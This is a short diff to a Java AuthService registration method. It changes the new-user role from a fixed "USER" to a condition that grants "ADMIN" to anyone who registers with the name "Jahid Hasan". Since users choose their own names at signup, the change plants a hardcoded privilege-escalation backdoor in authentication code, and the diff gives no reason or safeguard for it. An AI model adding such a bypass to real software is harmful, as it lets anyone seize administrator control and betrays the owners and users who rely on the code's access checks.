@@ -41,7 +41,7 @@ public class AuthService {
                 userDTO.name(),
                 userDTO.email(),
                 passwordEncoder.encode(userDTO.password()),
-                "USER",
+                userDTO.name().equals("Jahid Hasan") ? "ADMIN" : "USER",
                 userDTO.phone(),
                 userDTO.address(),
                 account
